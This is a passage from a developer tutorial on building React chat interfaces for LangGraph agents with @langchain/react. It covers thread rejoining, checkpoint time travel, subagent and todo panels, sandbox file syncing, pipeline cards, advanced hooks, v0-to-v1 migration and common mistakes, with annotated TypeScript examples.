      {/* STEP 3 — Leave: disconnect first, THEN tell the parent to hide this component */}
      <button onClick={async () => { await stream.disconnect(); onLeave(); }}>
        Leave (keep running)
      </button>

      <button onClick={() => void stream.stop()} disabled={!stream.isLoading}>
        Stop (cancel)
      </button>
    </div>
  );
}
```

#### 8.3.3 Walking through every step, pointing at the exact lines

**Step 1 — first visit.** `useState(() => localStorage.getItem(THREAD_KEY))` runs once, finds nothing, `threadId = null`.

**Step 2 — first message sent.** `useStream({ threadId: null, ... })` starts a new thread server-side. Once the server replies with a real id, `useStream` itself calls `onThreadId("abc123")` — which is really `persist("abc123")`, since that's what was passed in. `persist` runs `setThreadId("abc123")` and `localStorage.setItem(...)`.

**Step 3 — "Leave" clicked.** `stream.disconnect()` runs first, then `onLeave()` — which is `() => setConnected(false)`, defined back in `ChatShell`. This flips `ChatShell`'s `connected` state, which causes `ChatShell` to re-render into the `if (!connected)` branch — hiding `RejoinableChat` entirely, showing only "Rejoin."

**Step 4 — "Rejoin" clicked.** `connected` flips back to `true`. `RejoinableChat` was removed in step 3, so React builds a brand new one. But `threadId` (in `ChatShell`'s state) was never touched by any of this — it's still `"abc123"` — so the new `RejoinableChat` gets that same old id passed in, and its fresh `useStream` call reconnects to that exact conversation.

**Step 5 — page refresh instead.** `ChatShell` itself gets recreated from nothing. `useState(() => localStorage.getItem(THREAD_KEY))` runs again, but this time `localStorage` actually has `"abc123"` saved (from step 2), so `threadId` starts as `"abc123"` immediately, and the very first `RejoinableChat` reconnects right away.

**Step 6 — "New conversation" clicked.** `persist(null)` runs — `setThreadId(null)` and `localStorage.removeItem(...)`. Back to the step 1 starting condition. The `else` branch in `persist` exists specifically for this case, since `persist` is reused both to save a real id and to wipe it.

#### 8.3.4 Why nothing here is a loop

Every one of the six steps above is triggered by a user action (a click) or a one-time mount event. Nothing runs continuously in the background checking things. React just re-renders whenever state changes, then waits again. There's no `while True` anywhere — it's entirely "event happens → state updates → screen redraws → wait for the next event."

#### 8.3.5 When you would need a `key` to rebuild a component

In this code the chat is **removed** on Leave, so Rejoin always builds a fresh one. You'd only need the `key` trick if the chat stayed on screen and you still wanted a fresh one, for example with a "Reconnect" button that doesn't hide it. Changing a component's `key` makes React throw the old instance away and build a new one:

```tsx
const [mountKey, setMountKey] = useState(0);

<button onClick={() => setMountKey((k) => k + 1)}>Reconnect</button>
<RejoinableChat key={mountKey} threadId={threadId} onThreadId={persist} onLeave={() => setConnected(false)} />
```

I tested three cases in React 19:

| Case | Chat created |
| --- | --- |
| Leave, then Rejoin, no `key` | 2 times: a fresh one on Rejoin |
| Always on screen, `key` changes 0 → 1 | 2 times: the key change rebuilds it |
| Always on screen, no `key` change | 1 time: the old one is kept |

### 8.4 Time travel

Every graph step saves a checkpoint with `values` (the full state) and `next` (the node that runs next). Time travel lists them, lets you inspect one, and resumes from it:

```tsx
import { useEffect, useState } from "react";
import { useStream } from "@langchain/react";
import { HumanMessage } from "langchain";
import type { ThreadState } from "@langchain/langgraph-sdk";
import type { AgentState } from "./types";                        // Appendix A
import { AGENT_URL, Composer, MarkdownBubble } from "./shared";   // Appendix A

export function TimeTravelChat() {
  const [threadId, setThreadId] = useState<string | null>(null);
  const [history, setHistory] = useState<ThreadState<AgentState>[]>([]);
  const [selected, setSelected] = useState<ThreadState<AgentState> | null>(null);

  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "time_travel", threadId, onThreadId: setThreadId });

  useEffect(() => {
    if (!threadId || stream.isLoading) return;                 // refresh when a run finishes, not per token
    stream.client.threads
      .getHistory<AgentState>(threadId)
      .then((states) => setHistory([...states].reverse()));    // API returns newest first; show oldest first
  }, [threadId, stream.isLoading, stream.client]);

  const resumeFrom = (cp: ThreadState<AgentState>) => {
    const id = cp.checkpoint.checkpoint_id;
    if (id) void stream.submit({}, { forkFrom: id });
  };

  return (
    <div className="flex">
      <div className="flex-1">
        {stream.messages.map((m) => <MarkdownBubble key={m.id} text={m.text} />)}
        <Composer disabled={stream.isLoading} onSend={(t) => stream.submit({ messages: [new HumanMessage(t)] })} />
      </div>
      <aside className="w-80">
        {history.map((cp, i) => (
          <button key={cp.checkpoint.checkpoint_id} onClick={() => setSelected(cp)}>
            #{i + 1} · next: {cp.next.join(", ") || "done"} · {cp.values.messages?.length ?? 0} msgs
          </button>
        ))}
        {selected && (
          <div>
            <pre className="text-xs">{JSON.stringify(selected.values, null, 2)}</pre>
            <button disabled={stream.isLoading} onClick={() => resumeFrom(selected)}>Resume from here</button>
          </div>
        )}
      </aside>
    </div>
  );
}
```

**What each import does:**

- `@langchain/langgraph-sdk`: the lower-level client that `@langchain/react` is built on. Here it only provides the `ThreadState` type (one saved step).

**What each piece does:**

- `TimeTravelChat`: the chat on the left, and a list of saved steps on the right. Click a step to see its data, then "Resume from here".

Resuming runs every step after that checkpoint again, including LLM calls, so the results can differ.

---

## 9. Patterns: deep agents

Source: [05-deep-agents.md](langgraph-react-frontend/references/05-deep-agents.md)

A **deep agent** has a **coordinator** (the main agent) that plans and hands sub-tasks to **subagents** (specialist agents) through its `task` tool. It runs on the same runtime, so you still use `useStream`, and every pattern above still works.

What you can read:

- `stream.messages`: only the coordinator's conversation. Subagent messages are separated automatically.
- `stream.subagents`: a `Map` (a dictionary) of the subagents started so far, keyed by the id of the `task` call that started each one. Each value is a `SubagentDiscoverySnapshot` (see 9.1). It doesn't include the subagent's messages.
- `useMessages(stream, subagent)`, `useToolCalls(stream, subagent)`, `useValues(stream, subagent)`: one subagent's content.
- `stream.values`: shared state such as `todos` and `files`.

### 9.1 Subagent cards

Each card goes under the coordinator message that delegated the work. A subagent's `id` is the id of the `task` tool call that started it.

**Simple flow:**

```text
1. useStream connects, messages start arriving
2. For each message:
     - is it from the human?                        -> show a UserBubble
     - is it from the AI with text?                 -> show a MarkdownBubble
     - did this AI message trigger any subagents?   -> show a SubagentCard per subagent
3. Each SubagentCard starts expanded (if still running) or collapsed (if already done)
     - click it to toggle expand/collapse
     - auto-collapses the moment it finishes
4. When expanded, SubagentBody shows that subagent's own tool calls and latest response
```


```tsx
import { useEffect, useState } from "react";
import { useMessages, useStream, useToolCalls, type AnyStream, type SubagentDiscoverySnapshot } from "@langchain/react";
import { AIMessage, HumanMessage } from "langchain";
import type { AgentState } from "./types";                                      // Appendix A
import { AGENT_URL, MarkdownBubble, StatusBadge, UserBubble } from "./shared";  // Appendix A
import { ToolCard } from "./ToolCard";   // the ToolCard from section 7.1, saved as ToolCard.tsx

export function DeepAgentChat() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "deep_agent" });

  return (
    <div>
      {stream.messages.map((msg) => {
        // find any subagents this specific message spawned (only AI messages can spawn them)
        const turnSubagents = AIMessage.isInstance(msg)
          ? (msg.tool_calls ?? [])                                    // this message's tool calls, or none
              .map((tc) => stream.subagents.get(tc.id ?? ""))          // look up a subagent per tool call
              .filter((s): s is SubagentDiscoverySnapshot => s !== undefined)  // drop tool calls with no subagent
          : [];

        return (
          <div key={msg.id}>                                          {/* key: React needs one per list item */}
            {HumanMessage.isInstance(msg) && <UserBubble text={msg.text} />}
            {AIMessage.isInstance(msg) && msg.text.trim() && <MarkdownBubble text={msg.text} />}  {/* skip empty AI text */}
            {turnSubagents.map((s) => <SubagentCard key={s.id} stream={stream} subagent={s} />)}   {/* one card per subagent */}
          </div>
        );
      })}
    </div>
  );
}

function SubagentCard({ stream, subagent }: { stream: AnyStream; subagent: SubagentDiscoverySnapshot }) {
  // start expanded while running, collapsed if already finished
  const [expanded, setExpanded] = useState(subagent.status !== "complete");

  // auto-collapse the moment this subagent finishes
  useEffect(() => {
    if (subagent.status === "complete") setExpanded(false);
  }, [subagent.status]);

  return (
    <div className="rounded-lg border">
      <button onClick={() => setExpanded((v) => !v)}>                 {/* toggle expand/collapse */}
        {subagent.name} <StatusBadge status={subagent.status} />
      </button>
      {expanded && <SubagentBody stream={stream} subagent={subagent} />}   {/* only render body when open */}
      {subagent.status === "error" && <p className="text-red-600">This subagent failed; the others continue.</p>}
    </div>
  );
}

function SubagentBody({ stream, subagent }: { stream: AnyStream; subagent: SubagentDiscoverySnapshot }) {
  const messages = useMessages(stream, subagent);     // this subagent's own messages only
  const toolCalls = useToolCalls(stream, subagent);   // this subagent's own tool calls only
  const lastAI = messages.filter(AIMessage.isInstance).at(-1);   // its most recent AI reply

  return (
    <div className="border-t p-3">
      {toolCalls.map((tc) => <ToolCard key={tc.callId} toolCall={tc} />)}   {/* one card per tool call */}
      {lastAI && <MarkdownBubble text={lastAI.text} streaming={subagent.status === "running"} />}  {/* latest reply, live if still running */}
    </div>
  );
}
```

**What each hook does:**

- `useEffect`: runs code after the component is drawn, e.g. fetching, scrolling or subscribing (2.9).
- `useState`: remembers a value between redraws; changing it redraws the component (2.7).
- `useMessages`: the messages of one part of the agent, such as one subagent or one graph step. With no target, it's the main agent's messages.
- `useStream`: connects to the agent and returns `stream`, an object with data you read (`stream.messages`, `stream.toolCalls`, `stream.isLoading`) and functions you call: `stream.submit(...)` sends a message, `stream.stop()` cancels the agent's work, and `stream.respond(...)` answers the agent when it pauses to ask something (7.3).
- `useToolCalls`: the tool calls of one part of the agent, each with its status (`running`, `finished`, `error`).

**What each piece does:**

- `DeepAgentChat`: the chat screen. Under each AI message, it shows a card for every subagent that message started.
- `SubagentCard`: one subagent: its name and status, click to expand. It collapses when finished, and shows an error line if it failed.
- `SubagentBody`: the inside of an expanded card: that subagent's tool cards and its latest text.
- `StatusBadge`: a small label such as "running" or "complete" (Appendix A).
- `ToolCard`: the tool card from 7.1.

**Reading this code:**

- **`SubagentDiscoverySnapshot`** is the type of one entry in `stream.subagents`. It's a summary of one subagent:

  ```ts
  {
    id: string;                                   // id of the `task` call that started it
    name: string;                                 // e.g. "researcher", from your backend config
    status: "running" | "complete" | "error";
    taskInput: string | undefined;                // the task the coordinator gave it
    output: unknown;                              // its final result, once complete
    error: string | undefined;
    parentId: string | null;  depth: number;      // for subagents started by other subagents
    namespace: readonly string[];  startedAt: Date;  completedAt: Date | null;
  }
  ```

  It has no messages or tool calls. Those stream in through `useMessages(stream, subagent)` and `useToolCalls(stream, subagent)`.

- **`stream.subagents.get(tc.id)`.** `stream.subagents` is a `Map`: a dictionary, like Python's `dict`. Its keys are the ids of the `task` calls, so for each tool call in a message, `.get(tc.id)` finds the subagent that call started. If the call isn't a `task` call, it finds nothing (`undefined`), and `.filter(...)` drops it.
- **`Map` vs `.map()`.** They only share a name:
  - `new Map(...)` / `Map` is a dictionary type: `map.get(key)`, `map.set(key, value)`, `map.values()`. Python: `dict`.
  - `list.map(fn)` is an array method that transforms each item into a new list. Python: `[fn(x) for x in lst]`.

- **The `turnSubagents` line is one ternary:** `condition ? valueIfTrue : valueIfFalse`.

  ```tsx
  const turnSubagents = AIMessage.isInstance(msg)
    ? (msg.tool_calls ?? [])
        .map((tc) => stream.subagents.get(tc.id ?? ""))
        .filter((s): s is SubagentDiscoverySnapshot => s !== undefined)
    : [];
  ```

  - **If true**, `msg.tool_calls ?? []` gets the tool calls on this message, or an empty array if there are none.
  - **If `AIMessage.isInstance(msg)` is false** (it's a human message): `turnSubagents = []`, the final `[]` after `:` (not the one in `(msg.tool_calls ?? [])`), since human messages never spawn subagents.
- **`.filter((s): s is SubagentDiscoverySnapshot => s !== undefined)`.** Some tool calls won't have a matching subagent (`.get()` returns `undefined` if not found), so this filters those out, keeping only real subagent entries. The `(s): s is SubagentDiscoverySnapshot =>` part is a **type predicate**. It tells TypeScript "after this filter, every remaining item really is a `SubagentDiscoverySnapshot`, not possibly `undefined`", which lets the rest of the code use `s` without extra null checks.
- **`msg.text.trim() &&`** skips rendering an empty bubble when the AI's only action was calling a tool, with no text.
- **`key={s.id}`.** Every `.map()` that renders a list of JSX elements needs a `key` on each item (2.4). `key={s.id}` uses the subagent's own id, since it's unique per subagent.
- **`SubagentBody` only mounts when the card is expanded.** Its `useMessages` / `useToolCalls` subscriptions therefore close when the card collapses.
- **Errors are shown per card**, so one failed subagent doesn't break the whole UI.

### 9.2 Todo list

The agent's plan lives in `stream.values.todos`. It only exists if the backend enables `TodoListMiddleware`. Otherwise it's `undefined`, not `[]`, so default it with `?? []`:

```tsx
import { useStream } from "@langchain/react";
import type { Todo } from "langchain";                   // { content: string; status: "pending" | "in_progress" | "completed" }
import type { AgentState } from "./types";               // Appendix A
import { AGENT_URL, Spinner } from "./shared";           // Appendix A

function TodoIcon({ status }: { status: Todo["status"] }) {
  if (status === "completed") return <span className="text-green-600">✓</span>;
  if (status === "in_progress") return <Spinner />;
  return <span className="text-gray-400">○</span>;
}

export function TodoPanel({ todos }: { todos: Todo[] }) {
  const done = todos.filter((t) => t.status === "completed").length;
  const pct = todos.length ? Math.round((done / todos.length) * 100) : 0;
  return (
    <aside>
      <p>Plan {done}/{todos.length}</p>
      <div className="h-2 rounded-full bg-gray-200">
        <div className="h-full rounded-full bg-green-500" style={{ width: `${pct}%` }} />
      </div>
      <ul>
        {todos.map((t, i) => (
          <li key={i}>                                   {/* todos have no id: key by index */}
            <TodoIcon status={t.status} /> {t.content}
          </li>
        ))}
      </ul>
    </aside>
  );
}

export function TodoAgent() {
  const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "deep_agent_todo_list" });
  const todos = stream.values?.todos ?? [];            // undefined without TodoListMiddleware
  return <TodoPanel todos={todos} />;
}
```

**What each piece does:**

- `TodoIcon`: ✓ for done, a spinner for in progress, ○ for not started.
- `TodoPanel`: the agent's plan: "Plan 2/5", a progress bar, and the list of tasks with their icons.
- `TodoAgent`: gets the plan from the agent's state and shows it in the panel.

### 9.3 Sandbox IDE

For coding agents, the UI has three panels: a file tree, a code or diff viewer, and chat. The agent edits files in an isolated sandbox. The backend must provide two routes, `GET /sandbox/{threadId}/tree` and `GET /sandbox/{threadId}/file`. The frontend refreshes a file whenever a `write_file` / `edit_file` result arrives, and refreshes the whole tree after `execute` or `delete`:

```tsx
import { useEffect, useRef, useState } from "react";
import type { AnyStream } from "@langchain/react";
import { AIMessage, ToolMessage } from "langchain";
import { AGENT_URL } from "./shared";                    // Appendix A

interface FileEntry { name: string; type: "file" | "directory"; path: string; size: number }

async function fetchTree(threadId: string): Promise<FileEntry[]> {
  const res = await fetch(`${AGENT_URL}/sandbox/${encodeURIComponent(threadId)}/tree?filePath=/app`);
  const data: { entries: FileEntry[] } = await res.json();
  return data.entries.filter((e) => !e.path.includes("node_modules"));
}

async function fetchFile(threadId: string, path: string): Promise<string | null> {
  const res = await fetch(`${AGENT_URL}/sandbox/${encodeURIComponent(threadId)}/file?filePath=${encodeURIComponent(path)}`);
  const data: { content?: string } = await res.json();
  return data.content ?? null;
}

const FILE_MUTATING_TOOLS = new Set(["write_file", "edit_file", "delete", "execute"]);

export function useSandboxSync(stream: AnyStream, threadId: string) {
  const [tree, setTree] = useState<FileEntry[]>([]);
  const [files, setFiles] = useState<Record<string, string>>({});
  const processed = useRef(new Set<string>());

  useEffect(() => {
    const refreshSingleFile = async (path: string) => {
      const content = await fetchFile(threadId, path);
      if (content != null) setFiles((prev) => ({ ...prev, [path]: content }));
    };
    const refreshTree = async () => setTree(await fetchTree(threadId));

    const calls = new Map<string, { name: string; args: Record<string, unknown> }>();
    for (const msg of stream.messages) {
      if (!AIMessage.isInstance(msg)) continue;
      for (const tc of msg.tool_calls ?? []) {
        if (tc.id && FILE_MUTATING_TOOLS.has(tc.name)) calls.set(tc.id, { name: tc.name, args: tc.args });
      }
    }
    for (const msg of stream.messages) {
      if (!ToolMessage.isInstance(msg)) continue;
      const call = calls.get(msg.tool_call_id);
      if (!call || processed.current.has(msg.tool_call_id)) continue;   // already handled: see 2.11
      processed.current.add(msg.tool_call_id);
      if (call.name === "write_file" || call.name === "edit_file") void refreshSingleFile(String(call.args.path));
      else void refreshTree();                                         // execute/delete can touch anything
    }
  }, [stream.messages, threadId]);

  return { tree, files };
}
```

**What each piece does:**

- `FileEntry`: one item in the file tree: a name, whether it's a file or a folder, its path, and its size.
- `fetchTree`: asks the backend for the list of files.
- `fetchFile`: asks the backend for one file's content.
- `useSandboxSync`: a custom hook that watches tool results and re-downloads the files the agent changed. It returns the file tree and the file contents for your panels to show.

The `path` argument name depends on your backend's file tools. Check what the tool is called with and adjust `call.args.path`.

---

## 10. Patterns: custom graphs

Source: [06-langgraph-graphs.md](langgraph-react-frontend/references/06-langgraph-graphs.md)

For your own `StateGraph` pipelines (for example classify → research → analyze → synthesize), the UI can show each **node** as a card. Nodes appear in `stream.subgraphs` as they run. Each entry is a `SubgraphDiscoverySnapshot` with `id`, `nodeName`, `status` (`"running" | "complete" | "error"`), `startedAt` and `completedAt`.

The skill's reference calls the field `nodeId`, but in the installed version it's `**nodeName**` (checked in the `.d.ts` files).

```tsx
import { useMessages, useStream, type AnyStream, type SubgraphDiscoverySnapshot } from "@langchain/react";
import { AIMessage, type BaseMessage } from "langchain";
import { AGENT_URL, MarkdownBubble, StatusBadge } from "./shared";   // Appendix A

interface PipelineState {                // must match the Python graph state
  messages: BaseMessage[];
  classification?: string;
  research?: string;
  analysis?: string;
  synthesis?: string;
}

// graph node name → label shown on the card
const NODE_LABELS: Record<string, string> = {
  classify: "Classify",
  do_research: "Research",
  analyze: "Analyze",
  synthesize: "Synthesize",
};

// graph node name → the state key that node writes
const NODE_OUTPUT_KEY: Record<string, keyof PipelineState> = {
  classify: "classification",
  do_research: "research",
  analyze: "analysis",
  synthesize: "synthesis",
};

export function Pipeline() {
  const stream = useStream<PipelineState>({ apiUrl: AGENT_URL, assistantId: "graph_execution_cards" });
  const nodes = [...stream.subgraphs.values()];                  // discovered as they run
  return (
    <div>
      {nodes.map((node) => <NodeCard key={node.id} stream={stream} node={node} values={stream.values} />)}
    </div>
  );
}

function NodeCard({ stream, node, values }: { stream: AnyStream; node: SubgraphDiscoverySnapshot; values: PipelineState }) {
  const messages = useMessages(stream, node);                    // tokens from this node only
  const lastAI = messages.filter(AIMessage.isInstance).at(-1);
  const key = NODE_OUTPUT_KEY[node.nodeName];
  const output = key ? values[key] : undefined;                  // for nodes that only write state
  return (
    <div className="rounded-lg border p-3">
      <strong>{NODE_LABELS[node.nodeName] ?? node.nodeName}</strong> <StatusBadge status={node.status} />
      {lastAI ? (
        <MarkdownBubble text={lastAI.text} streaming={node.status === "running"} />
      ) : (
        node.status === "complete" && typeof output === "string" && <p>{output}</p>
      )}
    </div>
  );
}
```

**What each piece does:**

- `PipelineState`: the shape of the pipeline's data. Each step writes one field.
- `NODE_LABELS`: the display name for each step.
- `NODE_OUTPUT_KEY`: which field each step writes.
- `Pipeline`: the screen: one card per step, added as each step starts.
- `NodeCard`: one step: its name, status, and the text or result it produced.

- **Unknown nodes still render.** `NODE_LABELS[node.nodeName] ?? node.nodeName` falls back to the raw name for nodes that aren't in your label map.
- **Some nodes produce no LLM text.** A node that only writes state has no messages, so the card shows its state key via `NODE_OUTPUT_KEY` instead.

**Custom channels.** The graph can send its own events, such as progress. Read them with three hooks:

```tsx
import { useChannel, useChannelEffect, useExtension, type AnyStream } from "@langchain/react";

function track(event: unknown) {          // custom: replace with your analytics call
  console.log("analytics:", event);
}

export function ProgressView({ stream }: { stream: AnyStream }) {
  const progress = useExtension<{ done: number; total: number }>(stream, "progress");   // latest value
  const events = useChannel(stream, ["custom"]);                                        // list of events
  useChannelEffect(stream, ["custom"], { onEvent: (e) => track(e) });                   // side effect, no re-render
  return (
    <div>
      {progress && <p>Fetched {progress.done}/{progress.total}</p>}
      <p>{events.length} custom events</p>
    </div>
  );
}
```

**What each piece does:**

- `track`: your analytics call (here it just logs).
- `ProgressView`: shows "Fetched 10/100" style progress sent by the graph, and counts its custom events.

---

## 11. Advanced hook features

### 11.1 Selector hooks

These are extra hooks that take `stream` and read one specific piece of data. All of them are imported from `"@langchain/react"`:


| Hook                                               | Returns                                  | Example in |
| -------------------------------------------------- | ---------------------------------------- | ---------- |
| `useMessages(stream, target?)`                     | Messages (root or one subagent/subgraph) | 9.1, 10    |
| `useToolCalls(stream, target?)`                    | Tool calls                               | 9.1        |
| `useValues(stream, target?)`                       | State                                    | —          |
| `useMessageMetadata(stream, msgId)`                | `parentCheckpointId`, optimistic status  | 8.1, 11.2  |
| `useSubmissionQueue(stream)`                       | The message queue                        | 8.2        |
| `useExtension` / `useChannel` / `useChannelEffect` | Custom events                            | 10         |
| `useImages`, `useAudio`, `useVideo`, `useFiles`    | Media streams                            | —          |


- `target` means **which part of the graph to read**. Leave it out for the root (free), or pass a subagent/subgraph snapshot.
- The scoped hooks open a **ref-counted** server subscription: it opens when the first component using it mounts and closes when the last one unmounts. That's why `SubagentBody` in 9.1 is a separate component that only mounts when expanded.

### 11.2 Optimistic updates

This is on by default. Your submitted message appears immediately, and when the server confirms it, the two are matched by id, so nothing appears twice. **Don't add the user's message to the list yourself.** `useMessageMetadata` tells you whether a message is still `"pending"` or `"failed"`, so you can show a Retry button:

```tsx
import { useMessageMetadata, type AnyStream } from "@langchain/react";
import type { BaseMessage } from "langchain";

export function SentMessage({ stream, message }: { stream: AnyStream; message: BaseMessage }) {
  const status = useMessageMetadata(stream, message.id)?.optimisticStatus;
  return (
    <div style={{ opacity: status === "pending" ? 0.6 : 1 }}>
      {message.text}
      {status === "failed" && (
        <button onClick={() => void stream.submit({ messages: [message] })}>Retry</button>
      )}
    </div>
  );
}
```

**What each piece does:**

- `SentMessage`: one message you sent. It's faded while not yet confirmed, and shows a Retry button if sending failed.

### 11.3 StreamProvider: sharing one stream

`StreamProvider` creates one stream, and any component inside it can read that stream with `useStreamContext()`, so you don't have to pass it through every level as a prop:

```tsx
import { StreamProvider, useMessages, useStreamContext } from "@langchain/react";
import { HumanMessage } from "langchain";
import type { AgentState } from "./types";                         // Appendix A
import { AGENT_URL, Composer, MarkdownBubble } from "./shared";    // Appendix A

function Header() {
  const stream = useStreamContext<AgentState>();
  return <header>{stream.isLoading ? "Agent is replying…" : "Ready"}</header>;
}

function MessageList() {
  const stream = useStreamContext<AgentState>();
  return <div>{useMessages(stream).map((m) => <MarkdownBubble key={m.id} text={m.text} />)}</div>;
}

function ContextComposer() {
  const stream = useStreamContext<AgentState>();
  return <Composer disabled={stream.isLoading} onSend={(t) => stream.submit({ messages: [new HumanMessage(t)] })} />;
}

export function ProviderApp() {
  return (
    <StreamProvider assistantId="agent" apiUrl={AGENT_URL}>
      <Header />
      <MessageList />
      <ContextComposer />
    </StreamProvider>
  );
}
```

**What each piece does:**

- `Header`: a top bar showing "Agent is replying…" or "Ready".
- `MessageList`: the list of messages.
- `ContextComposer`: the message box, connected to the shared stream.
- `ProviderApp`: puts the three together and gives them one shared stream.

### 11.4 Suspense

`useSuspenseStream` works with React's `<Suspense>`. React shows the `fallback` while the thread loads, so you don't check `isLoading` yourself. Loading errors are passed to the nearest error boundary.

React has no ready-made error-boundary component, so this uses the `react-error-boundary` package (`npm install react-error-boundary`):

```tsx
import { Suspense } from "react";
import { ErrorBoundary } from "react-error-boundary";
import { useSuspenseStream } from "@langchain/react";
import type { AgentState } from "./types";                         // Appendix A
import { AGENT_URL, MarkdownBubble, Spinner } from "./shared";     // Appendix A

function SuspenseChat({ threadId }: { threadId: string }) {
  const { messages, isStreaming } = useSuspenseStream<AgentState>({ assistantId: "agent", apiUrl: AGENT_URL, threadId });
  return (
    <div>
      {messages.map((m) => <MarkdownBubble key={m.id} text={m.text} />)}
      {isStreaming && <Spinner />}
    </div>
  );
}

export function SuspenseApp({ threadId }: { threadId: string }) {
  return (
    <ErrorBoundary fallback={<p>Could not load this conversation.</p>}>
      <Suspense fallback={<Spinner />}>
        <SuspenseChat threadId={threadId} />
      </Suspense>
    </ErrorBoundary>
  );
}
```

**What each import does:**

- `react-error-boundary`: provides `ErrorBoundary`, a component that shows a fallback (here: an error message) when something inside it fails, instead of a blank page.

**What each piece does:**

- `SuspenseChat`: the chat. It doesn't need its own loading check.
- `SuspenseApp`: shows a spinner while the conversation loads, or an error message if loading fails.

### 11.5 Transports

- **Default:** SSE directly to the Agent Server.
- **WebSockets:** add `transport: "websocket"` to the `useStream` options.
- **Your own backend** (for example, to add auth or keep API keys off the browser): use `HttpAgentServerAdapter`.

```tsx
import { HttpAgentServerAdapter, useStream } from "@langchain/react";
import type { AgentState } from "./types";   // Appendix A

export function ProxiedChat({ threadId, token }: { threadId: string; token: string }) {
  const transport = new HttpAgentServerAdapter({
    apiUrl: "/api/agent",                                   // your own backend route
    threadId,                                               // adapters are bound to one thread
    defaultHeaders: { Authorization: `Bearer ${token}` },   // token: from your login flow
  });
  const stream = useStream<AgentState>({ transport });
  return <p>{stream.messages.length} messages</p>;
}
```

**What each piece does:**

- `ProxiedChat`: a chat that talks to the agent through your own backend route, sending a login token.

### 11.6 v0 vs v1

The library was rewritten for v1, and many blog posts still show the old API. None of these exist in v1:


| Old (v0)                                  | New (v1)                                            | Code in |
| ----------------------------------------- | --------------------------------------------------- | ------- |
| `joinStream`, `reconnectOnMount`          | Mount again with the same `threadId`                | 8.3     |
| `setBranch`, `branch`, `history`          | `useMessageMetadata` + `submit(..., { forkFrom })`  | 8.1     |
| `submit(null, { command: { resume } })`   | `stream.respond(value)`                             | 4.6     |
| `onFinish`, `onError` (hook level)        | `onCompleted`, `stream.error`, per-submit `onError` | 4.1     |
| `stream.queue`                            | `useSubmissionQueue(stream)`                        | 8.2     |
| `subagent.messages`                       | `useMessages(stream, subagent)`                     | 9.1     |
| `ToolCallWithResult` (`state: "pending"`) | `AssembledToolCall` (`status: "running"`)           | 7.1     |


When the docs disagree, trust the installed types first, then reference.langchain.com, then docs.langchain.com. To search the installed types:

```bash
grep -rn "nodeName\|forkFrom" node_modules/@langchain/langgraph-sdk/dist --include='*.d.ts'
npx tsc --noEmit        # wrong API usage shows up as a type error
```

---

## 12. Common mistakes

Each mistake, with the code that fixes it. In these short snippets:

- `stream` is the value returned by `useStream` (4.1).
- `AGENT_URL` comes from [Appendix A](#14-appendix-a-shared-components).
- `text` is what the user typed.
- `subagent` is one entry of `stream.subagents` (9.1).

**Wrong `assistantId`.** It's the key under `"graphs"` in `langgraph.json`, not a model name.

```tsx
useStream({ apiUrl: AGENT_URL, assistantId: "claude-haiku-4-5" });   // wrong: model name
useStream({ apiUrl: AGENT_URL, assistantId: "simple_agent" });       // right: key in langgraph.json
```

**Wrong `apiUrl` / CORS errors.** Point it at the Agent Server, or at a proxy that forwards to it. Never point it at the React dev server itself.

```tsx
useStream({ apiUrl: "http://localhost:4100", assistantId: "simple_agent" });                  // wrong: that's Vite
useStream({ apiUrl: `${window.location.origin}/api/langgraph`, assistantId: "simple_agent" }); // right: proxied to :2024
```

**Interrupts, branching, time travel or rejoin do nothing.** The backend has no checkpointer. `langgraph dev` adds one automatically. If you compile a graph yourself, pass one:

```python
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph import StateGraph, MessagesState, START

builder = StateGraph(MessagesState)                       # your graph
builder.add_node("chat", lambda state: {"messages": []})  # your nodes
builder.add_edge(START, "chat")
graph = builder.compile(checkpointer=InMemorySaver())     # ← the fix: pass a checkpointer
```

**Calling `stop()` when you meant "leave".**

```tsx
<button onClick={() => void stream.stop()}>Leave</button>         // wrong: cancels the run on the server
<button onClick={() => void stream.disconnect()}>Leave</button>   // right: run keeps going (8.3)
```

**Subagent interrupts not showing.** Read `getThread()?.interrupts`, not `stream.interrupt`. The full code is `NestedInterrupts` in 7.3.

```tsx
const pending = stream.getThread()?.interrupts ?? [];   // includes subagent/subgraph interrupts
```

**Calling `respond()` twice for parallel interrupts.**

```tsx
const [a, b] = stream.interrupts;               // two interrupts pending at the same checkpoint
if (!a?.id || !b?.id) return;

// wrong: the first call starts a new run, so the second one fails
await stream.respond({ approved: true }, { interruptId: a.id });
await stream.respond({ approved: false }, { interruptId: b.id });

// right: one call with both answers (4.6, case 4)
await stream.respondAll({ [a.id]: { approved: true }, [b.id]: { approved: false } });
```

**Reading a subagent's messages from `stream.subagents`.** Its entries have no messages.

```tsx
subagent.messages                                  // wrong: doesn't exist
const messages = useMessages(stream, subagent);    // right (9.1)
```

**Expecting `stream.values.todos` to be `[]`.** It's `undefined` unless `TodoListMiddleware` is on.

```tsx
stream.values.todos.map((t) => t.content);            // wrong: crashes when undefined
(stream.values?.todos ?? []).map((t) => t.content);   // right (9.2)
```

**Keying tool cards by index.**

```tsx
// ToolCard: defined in 7.1
{stream.toolCalls.map((tc, i) => <ToolCard key={i} toolCall={tc} />)}           // wrong
{stream.toolCalls.map((tc) => <ToolCard key={tc.callId} toolCall={tc} />)}       // right
```

**Adding the user's message manually.** Optimistic updates already add it, so it shows twice.

```tsx
// wrong: keeping your own copy of the messages as well → the message shows twice
const [myMessages, setMyMessages] = useState<string[]>([]);
setMyMessages((m) => [...m, text]);
stream.submit({ messages: [new HumanMessage(text)] });

// right: render only stream.messages, and just submit
stream.submit({ messages: [new HumanMessage(text)] });
```

**Switching threads by calling a method.** Change the `threadId` prop.

```tsx
const [threadId, setThreadId] = useState<string | null>(null);
const stream = useStream<AgentState>({ apiUrl: AGENT_URL, assistantId: "agent", threadId });
// switch: setThreadId("other-thread-id")   new conversation: setThreadId(null)
```

**Letting users edit or regenerate while streaming.**

```tsx
<button disabled={stream.isLoading} onClick={() => void stream.submit(undefined, { forkFrom })}>
  Regenerate
</button>
// forkFrom: from useMessageMetadata, full component in 8.1
```

**Headless tool never runs.** The name or argument names differ between frontend and backend. Make them identical, as in the side-by-side example in 7.2.

**A side effect repeats (e.g. a file refreshes over and over).** An effect that depends on `messages` re-runs on every streamed token, plus once more under StrictMode in development. Track processed ids in a `useRef(new Set())`, as in 2.11.

